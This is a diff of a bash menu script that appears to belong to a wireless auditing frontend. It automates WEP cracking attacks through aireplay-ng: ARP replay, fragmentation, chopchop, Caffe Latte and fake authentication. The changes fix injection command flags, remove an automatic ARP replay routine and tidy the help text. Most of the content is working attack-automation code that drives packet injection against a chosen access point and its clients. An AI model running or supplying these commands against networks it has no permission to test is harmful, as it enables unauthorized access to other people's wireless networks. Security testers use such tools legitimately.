@@ -20,7 +20,7 @@ check_function auth_attacks_fake || source $path/attacks/auth # It depends on au
 check_function injectmenu || source $path/attacks/injection # It depends on injection module ;)
 
 check_client(){
-	[[ $dynamic_client_selection ]] && select_target
+	[[ $dynamic_client_selection ]] && { auto_scan_clients; select_client; }
 	[[ $Client_MAC != ""  ]] && { directed=1; return 0; }
 }
 
@@ -37,31 +37,29 @@ wep_attacks_menu(){
 	help_fifo "${mark}${red}Wep attacks${end}\n"\
 		"You're seeing this menu because the network you selected has WEP encryption\n"\
 		"Here follows some information about each attack\n"\
-		"${red}ARP Replay${end}\n"
+		"${red}ARP Replay${end}\n" \
 		"Standard arp replay, tries to capture an arp and send it back to the router to generate traffic. If not client selected, it'll launch a fake auth attack to simulate one \n"\
-		"${red}Fragmentation ${end}\n"
+		"${red}Fragmentation ${end}\n"\
 		"Here follows some information about each attack\n"\
-		"${red}ChopChop  ${end}\n"
+		"${red}ChopChop  ${end}\n"\
 		"Here follows some information about each attack\n"\
-		"${red}Caffe Latte${end}\n"
+		"${red}Caffe Latte${end}\n"\
 		"Here follows some information about each attack\n"
 
     while true; do $clear 
 	    mkmenu "Attacks using a client"\
-		    "ARP replay => Automatic"\
-            "ARP replay => Interactive"\
+            "ARP replay"\
             "Fragmentation attack"\
             "Chopchop attack"\
             "Cafe latte"\
             "Return to main menu"
 
             case $choice in
-                1) check_client ;  wep_attacks arpreplay_auto; break ;;
-                2) check_client ;  wep_attacks arpreplay_interactive; break ;;
-                3) check_client ;  wep_attacks fragmentation -7; break ;;  
-                4) check_client ;  wep_attacks chopchopclient; break ;;
-                5) check_client ;  wep_attacks caffelate; break ;;
-                6) $clear; break ;;
+                1) check_client ;  wep_attacks arpreplay_interactive; break ;;
+                2) check_client ;  wep_attacks fragmentation -7; break ;;  
+                3) check_client ;  wep_attacks chopchopclient; break ;;
+                4) check_client ;  wep_attacks caffelate; break ;;
+                5) $clear; break ;;
                 *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
             esac
     done
@@ -94,34 +92,14 @@ wep_attacks_caffelate(){
 	auth_attacks_fake 
 }
 
-wep_attacks_arpreplay_auto(){
-	FT_="f"; INJMAC_="FF:FF:FF:FF:FF:FF"; interactive_wep;
-
-	if [[ $directed == 1 ]]; then
-		wait_for_execute=1	
-		execute "Directed injection in Host: $Host_MAC for client $Client_MAC"\
-			$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
-			 -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE
-		wait_for_execute=0
-		check_dump_xor && { wep_attacks pskarp; } || { echo -e "Something failed, XOR not generated, did the PRGA capture failed?.\nPress any key to continue" ; }
-	else
-		auth_attacks_fake &
-		wait_for_execute=0	
-		execute "Injection in Host: $Host_MAC, with fake auth "\
-			$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
-			 -$FT 1 -m 68 -n 86  -h $FAKE_MAC -x $INJECTRATE
-	fi
-}
-
 wep_attacks_arpreplay_interactive(){
 	FT_="0841"; INJMAC_="FF:FF:FF:FF:FF:FF"; interactive_wep;
 
     if [[ $directed == 1 ]]; then
-		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
-		check_dump_xor && { wep_attacks pskarp; } || { echo -e "Something failed, XOR not generated, did the PRGA capture failed?.\nPress any key to continue" ; }
+		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $Client_MAC -x $INJECTRATE 
 	else
 		auth_attacks_fake &
-		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
+		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE 
 	fi
 }
 
@@ -142,13 +120,14 @@ wep_attacks_fragmentation(){
 wep_attacks_chopchop(){
     $clear
 	hardclean replay_dec-*.xor
+
 	[[ $directed != 1 ]] && {
 		execute "Chopchoping at $Host_SSID"\
 			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & 
 		auth_attacks_fake &
 	} || {
 		execute "Directed ChopChoping to $Client_MAC at $Host_SSID"\
-			$AIREPLAY --chopchop -h $Client_MAC $iwifi &
+			$AIREPLAY  --chopchop -b $Host_MAC -h $Client_MAC $iwifi &
 	}
 	injectmenu chopchop
 }
